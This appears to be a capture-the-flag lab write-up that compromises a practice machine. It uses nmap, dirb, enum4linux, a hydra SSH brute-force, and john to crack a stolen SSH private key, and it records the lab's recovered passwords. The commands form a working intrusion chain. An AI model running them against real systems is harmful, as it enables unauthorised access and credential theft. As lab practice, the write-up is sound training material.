# Information Gathering
> nmap -a $TARGET
Useful resoults:
  * port 22 ssh open, + ssh keys
  * port 80 open
  
checked the webpage:
viewed source code:

Hint:
> "\<!-- Check our dev note section if you need to know what to work on. -->"

### BruteForce time!
Used dirb:
> dirb $TARGET /usr/share/wordlists/dirb/common.txt

found web dir: /development/ :
  * /development/dev.txt : mentioned apache version 2.5.12
  * /development/j.txt : etc/shadow and crackable hash
  
### enum time!
we are asked to find usernames:
> enum4linux -U $TARGET 

output: 
```
[+] Enumerating users using SID S-1-22-1 and logon username '', password ''
S-1-22-1-1000 Unix User\kay (Local User)
S-1-22-1-1001 Unix User\jan (Local User)
```

### Crack Jan's password
Used hydra on ssh
> hydra -l jan -P /usr/share/wordlists/rockyou.txt ssh://$TARGET

after 10 mins, found the password:
> [22][ssh] host: 10.10.93.208   login: jan   password: armando

Now we can log into the machine via jan:armando on ssh

---

### PrivEsc
* Manual:
 	1. /etc/shadow perms : -rw-r-----  1 root shadow  1085 Apr 23  2018 shadow
 	2. /etc/passwd: 	
		* kay:x:1000:1000:Kay,,,:/home/kay:/bin/bash
  		* jan:x:1001:1001::/home/jan:/bin/bash
  	3. cd /home/kay and found pass.bak  (IMPORTANT)
 	4. cd /home/kay and found .ssh/ it contains ssh_keys which means we also have kay creds over ssh (IMPORTANT)
	
```
Grabbed private_keys from /home/kay/.ssh:
|	-rw-rw-r-- 1 kay kay  771 Apr 23  2018 authorized_keys
|	-rw-r--r-- 1 kay kay 3326 Apr 19  2018 id_rsa
|	-rw-r--r-- 1 kay kay  771 Apr 19  2018 id_rsa.pub
```

#### Crack time!
> python /usr/share/john/ssh2john.py id_rsa > id_rsa.hash

> john --wordlist=/usr/share/wordlists/rockyou.txt id_rsa.hash

found passphrase: beeswax

#### SSH to kay

> ssh -i /home/kay/.ssh/id_rsa kay@10.10.93.208

Enter passphrase for key '/home/kay/.ssh/id_rsa': beeswax
Done!

### pass.bak
> cat pass.bak

heresareallystrongpasswordthatfollowsthepasswordpolicy$$

  				



